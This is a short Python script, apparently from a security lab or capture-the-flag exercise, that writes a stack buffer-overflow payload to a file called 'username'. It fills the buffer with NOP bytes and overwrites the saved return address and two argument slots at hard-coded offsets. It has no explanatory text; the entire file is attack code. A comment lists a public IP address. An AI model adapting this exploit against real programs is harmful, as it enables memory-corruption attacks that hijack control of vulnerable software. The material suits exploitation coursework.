import sys 
 

# buffer -> ebp -> (buffer + s)(put ret address here) -> shellcode_start -> buffer + fread_size
# public ip: 20.2.219.154

fread_size = 1395
s = 652
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(fread_size)) 
# Put the shellcode at the end 
 
# Put the address at offset 150 
ret = 0x5655627a
# ret = 0x56556271
arg1 = 0xffffadf0 + 150
arg2 = 0xffffadf0 + 150
content[s:s+4] = (ret).to_bytes(4,byteorder='little') 
content[s+4:s+8] = (arg1).to_bytes(4,byteorder='little') 
content[s+8:s+12] = (arg2).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(content) 

